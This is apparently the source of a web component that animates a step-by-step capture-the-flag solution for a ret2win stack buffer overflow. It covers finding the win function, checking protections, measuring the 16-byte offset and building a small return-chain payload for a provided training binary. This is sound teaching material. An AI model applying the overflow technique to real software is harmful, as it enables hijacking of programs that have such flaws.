import { StepWalkthrough } from "./StepWalkthrough"
import {
  setSolveStep,
  solveStyles,
  solveTemplate,
} from "./PwnSolveWalkthrough"

const styles = /* css */ `
  .flow { display: flex; flex-wrap: wrap; align-items: center; justify-content: center; gap: 9px; }
  .flow-node { display: grid; justify-items: center; gap: 5px; min-width: 110px; padding: 12px; border: 1px solid var(--line); border-radius: 7px; background: var(--surface); text-align: center; }
  .flow-node strong { font: 700 17px var(--mono); }
  .flow-node span { color: var(--secondary); font-size: 11px; }
  .flow-node[data-target] { border-color: var(--accent); background: var(--accent-fill); }
  .flow-node[data-target] strong { color: var(--accent); }
  .arrow { color: var(--accent); font: 18px var(--mono); }
  .layout { display: grid; gap: 9px; }
  .layout-row { display: grid; grid-template-columns: minmax(95px, .9fr) minmax(0, 2fr) minmax(110px, 1fr); align-items: center; gap: 9px; }
  .layout-row .memory-name { color: var(--secondary); font: 12px var(--mono); }
  .layout-row .bytes { --count: 8; }
  .layout-row[data-rip] { padding-top: 9px; border-top: 1px dashed var(--danger); }
  .layout-row[data-rip] .byte { border-color: var(--danger); color: var(--danger); }
  .offset { display: flex; align-items: center; justify-content: center; gap: 9px; color: var(--secondary); font: 13px var(--mono); }
  .offset::before, .offset::after { width: 15%; height: 1px; background: var(--line); content: ""; }
  .payload-chain { display: grid; gap: 13px; }
  .payload-chain .payload { flex-wrap: nowrap; }
  .payload-chain .payload span { min-width: 50px; }
  .payload-segment { display: grid; justify-items: center; gap: 5px; }
  .payload-segment small { color: var(--secondary); font-size: 10px; }
  .payload-segment[data-ret] span { border-color: var(--accent); background: var(--accent-fill); color: var(--accent); }
  .payload-segment[data-win] span { border-color: var(--danger); background: var(--danger-fill); color: var(--danger); }
  .alignment { padding: 9px; border: 1px solid var(--line); border-radius: 6px; color: var(--secondary); font: 12px var(--mono); text-align: center; }
  .payload-code { padding: 11px 13px; border: 1px solid var(--line); border-radius: 6px; background: var(--surface); color: var(--ink); font: 12px/1.5 var(--mono); text-align: center; overflow-wrap: anywhere; }
  .result { display: grid; justify-items: center; gap: 10px; text-align: center; }
  .result strong { color: var(--accent); font-size: 24px; }
  .result .win-address { padding: 9px 13px; border: 1px solid var(--accent); border-radius: 6px; background: var(--accent-fill); color: var(--accent); font: 17px var(--mono); }
  :host(:is(:fullscreen, [data-expanded])) .flow { gap: 15px; }
  :host(:is(:fullscreen, [data-expanded])) .flow-node { min-width: 145px; padding: 16px; }
  :host(:is(:fullscreen, [data-expanded])) .flow-node strong { font-size: 22px; }
  :host(:is(:fullscreen, [data-expanded])) .flow-node span { font-size: 15px; }
  :host(:is(:fullscreen, [data-expanded])) .layout-row .memory-name { font-size: 16px; }
  :host(:is(:fullscreen, [data-expanded])) .layout-row .byte { min-height: 55px; font-size: 17px; }
  :host(:is(:fullscreen, [data-expanded])) .offset, :host(:is(:fullscreen, [data-expanded])) .alignment { font-size: 16px; }
  :host(:is(:fullscreen, [data-expanded])) .payload-chain .payload span { min-width: 62px; font-size: 15px; }
  :host(:is(:fullscreen, [data-expanded])) .payload-code { font-size: 17px; }
  :host(:is(:fullscreen, [data-expanded])) .payload-segment small { font-size: 13px; }
  :host(:is(:fullscreen, [data-expanded])) .result strong { font-size: 33px; }
  :host(:is(:fullscreen, [data-expanded])) .result .win-address { font-size: 22px; }
  @media (width < 760px) {
    .flow-node { min-width: 80px; padding: 8px; }
    .layout-row { grid-template-columns: 1fr; }
    .payload-chain .payload { flex-wrap: wrap; }
  }
`

const steps = [
  {
    title: "Find the target function",
    visual: `<div class="challenge-layout">
      <div class="source">
        <div class="source-line"><span class="line-no">05</span><code>void <span data-highlight>win</span>() { ... }</code></div>
        <div class="source-line"><span class="line-no">11</span><code>void <span data-risk>vuln</span>() {</code></div>
        <div class="source-line"><span class="line-no">12</span><code>  char buffer[<span data-highlight>8</span>];</code></div>
        <div class="source-line"><span class="line-no">17</span><code>  read(0, buffer, <span data-risk>64</span>);</code></div>
      </div>
      <div class="flow"><div class="flow-node"><strong>main</strong><span>calls vuln()</span></div><b class="arrow">→</b><div class="flow-node"><strong>vuln</strong><span>reads input</span></div><b class="arrow">→</b><div class="flow-node" data-target><strong>win</strong><span>target function</span></div></div>
    </div>`,
    commands: ["disas vuln"],
    output: "buffer: 8 bytes\nread: 64 bytes\nwin() prints success",
    caption: "The binary contains a win function; the vulnerable read can overwrite the saved return address.",
  },
  {
    title: "Check protections",
    visual: `<div class="badges">
      <div class="badge"><b>NO</b><span>stack canary</span></div>
      <div class="badge"><b>NO PIE</b><span>fixed code addresses</span></div>
      <div class="badge"><b>NX</b><span>stack not executable</span></div>
    </div>`,
    commands: ["checksec"],
    output: "Arch: amd64\nStack: No canary found\nPIE: No PIE (0x400000)\nNX: enabled",
    caption: "No PIE keeps win() at a fixed address; NX is fine because we return to existing code.",
  },
  {
    title: "Measure the return offset",
    visual: `<div class="layout">
      <div class="layout-row"><span class="memory-name">buffer · 8</span><div class="bytes">${Array.from({ length: 8 }, () => '<span class="byte" data-filled="">41</span>').join("")}</div><span class="address">input begins</span></div>
      <div class="offset">8 more bytes · saved RBP</div>
      <div class="layout-row" data-rip><span class="memory-name">saved RIP</span><div class="bytes">${Array.from({ length: 8 }, () => '<span class="byte" data-target="">??</span>').join("")}</div><span class="address">offset 16</span></div>
    </div>`,
    commands: ["disas vuln"],
    output: "buffer = $rbp - 0x8\nleave\nret\nsaved RIP = $rbp + 0x8\noffset = 16 bytes",
    caption: "Eight bytes fill buffer; eight more overwrite saved RBP. RIP is 16 bytes from buffer.",
  },
  {
    title: "Locate win and an alignment ret",
    visual: `<div class="flow">
      <div class="flow-node"><strong>ret</strong><span>0x40101a</span></div><b class="arrow">→</b><div class="flow-node" data-target><strong>win</strong><span>0x4011d6</span></div>
    </div>
    <div class="alignment">one ret aligns the stack before entering win()</div>`,
    commands: ["p/x &win", "rop"],
    output: "&win = 0x4011d6\nret gadget = 0x40101a",
    caption: "These addresses are from the provided non-PIE binary. The ret gadget fixes call-stack alignment.",
  },
  {
    title: "Build the return chain",
    visual: `<div class="payload-chain">
      <div class="payload">
        <div class="payload-segment"><span data-pad="">A × 16</span><small>reach saved RIP</small></div>
        <b class="arrow">→</b>
        <div class="payload-segment" data-ret><span>0x40101a</span><small>ret</small></div>
        <b class="arrow">→</b>
        <div class="payload-segment" data-win><span>0x4011d6</span><small>win()</small></div>
      </div>
      <code class="payload-code">b"A" * 16 + p64(0x40101a) + p64(0x4011d6)</code>
      <div class="alignment">payload: 16 padding bytes + p64(ret) + p64(win)</div>
    </div>`,
    commands: [],
    output: "16 bytes padding\nret gadget → win()",
    caption: "The 32-byte payload fits within read(..., 64).",
  },
  {
    title: "Confirm control reaches win",
    visual: `<div class="result"><div class="flow"><div class="flow-node"><strong>vuln</strong><span>returns</span></div><b class="arrow">→</b><div class="flow-node"><strong>ret</strong><span>aligns stack</span></div><b class="arrow">→</b><div class="flow-node" data-target><strong>win()</strong><span>reached</span></div></div><strong>You reached the WIN function!</strong><span class="win-address">RSP % 16 = 8 at win</span></div>`,
    commands: ["run < ret2win.bin"],
    output: "RSP % 16 = 8 at win()\nYou reached the WIN function!",
    caption: "The return chain reaches win() with the expected x86-64 stack alignment.",
  },
]

class Ret2WinSolve extends StepWalkthrough {
  protected readonly stepCount = steps.length

  protected template() {
    return solveTemplate("B0F3 · ret2win", this.stepCount, "ret2win solve")
  }

  protected styles() {
    return `${solveStyles}${styles}`
  }

  protected renderStep() {
    const current = steps[this.step]!
    setSolveStep(
      this.shadowRoot!,
      current.title,
      current.visual,
      current.commands,
      current.output,
      current.caption,
    )
  }
}

if (!customElements.get("ret2win-solve"))
  customElements.define("ret2win-solve", Ret2WinSolve)
